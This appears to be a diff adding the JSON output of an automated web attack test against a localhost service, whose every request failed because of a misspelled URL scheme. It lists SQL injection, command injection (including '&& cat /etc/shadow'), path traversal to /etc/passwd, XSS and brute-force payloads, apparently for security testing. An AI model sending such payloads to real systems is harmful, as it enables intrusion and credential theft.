@@ -1,0 +1,133 @@
+{
+  "target": "htpp://localhost:8082",
+  "timestamp": "2025-10-29T15:28:05.866580",
+  "results": [
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "SQLi",
+      "payload": "1' UNION SELECT NULL,NULL,NULL,NULL--"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "SQLi",
+      "payload": "1' AND 1=2--"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "SQLi",
+      "payload": "' OR 'a'='a"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "CommandInjection",
+      "payload": "&& cat /etc/shadow"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "SQLi",
+      "payload": "1' AND SLEEP(5)--"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "Traversal",
+      "payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/login'",
+      "attack_type": "AuthBrute",
+      "payload": "admin"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/login'",
+      "attack_type": "AuthBrute",
+      "payload": "admin"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "XSS",
+      "payload": "<script>alert('XSS')</script>"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "SQLi",
+      "payload": "1' ORDER BY 10--"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "Traversal",
+      "payload": "....\\....\\....\\windows\\system.ini"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "Traversal",
+      "payload": "../../etc/passwd"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "XSS",
+      "payload": "<body onload=alert('XSS')>"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "Traversal",
+      "payload": "../../../etc/passwd"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "CommandInjection",
+      "payload": "$(whoami)"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "CommandInjection",
+      "payload": "; ls -la"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "XSS",
+      "payload": "<iframe src='javascript:alert(1)'>"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "XSS",
+      "payload": "<iframe src=data:text/html,<script>alert('XSS')</script>>"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/login'",
+      "attack_type": "AuthBrute",
+      "payload": "admin"
+    },
+    {
+      "success": false,
+      "error": "No connection adapters were found for 'htpp://localhost:8082/api/search'",
+      "attack_type": "SQLi",
+      "payload": "' UNION SELECT table_name FROM information_schema.tables--"
+    }
+  ],
+  "stats": {
+    "total": 20,
+    "successful": 0,
+    "success_rate": 0.0,
+    "avg_latency": 0,
+    "variability": 0
+  }
+}
